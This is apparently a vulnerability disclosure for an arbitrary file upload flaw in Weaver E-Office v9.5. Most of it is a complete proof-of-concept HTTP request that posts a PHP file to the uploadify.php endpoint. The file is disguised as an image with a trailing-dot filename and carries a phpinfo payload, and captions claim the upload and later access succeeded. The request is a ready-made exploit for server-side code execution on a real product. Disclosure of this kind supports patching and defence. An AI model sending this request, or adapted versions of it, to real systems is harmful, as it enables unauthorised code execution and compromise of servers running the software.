weaver E-Office v9.5 file upload vulnerability

official website:https://www.e-office.cn/

Version:9.5

POC

```
POST /inc/jquery/uploadify/uploadify.php  HTTP/1.1
Host: xxxx8088
Content-Length: 204
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Connection: close

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="Fdiledata"; filename="uploadify.php."
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
```

![WPS图片(1)](https://user-images.githubusercontent.com/129963609/235029265-2aa60bb9-9629-4db0-8285-38f97348b76d.png)

uploadify.php was successfully uploaded and the random folder name is returned
![WPS图片(2)](https://user-images.githubusercontent.com/129963609/235029305-44db1491-0ada-42e9-bb1a-5c35473d6aee.png)

Access uploadify.php
![WPS图片(3)](https://user-images.githubusercontent.com/129963609/235029321-0099ed30-925f-428f-aa59-42e8e51c4515.png)
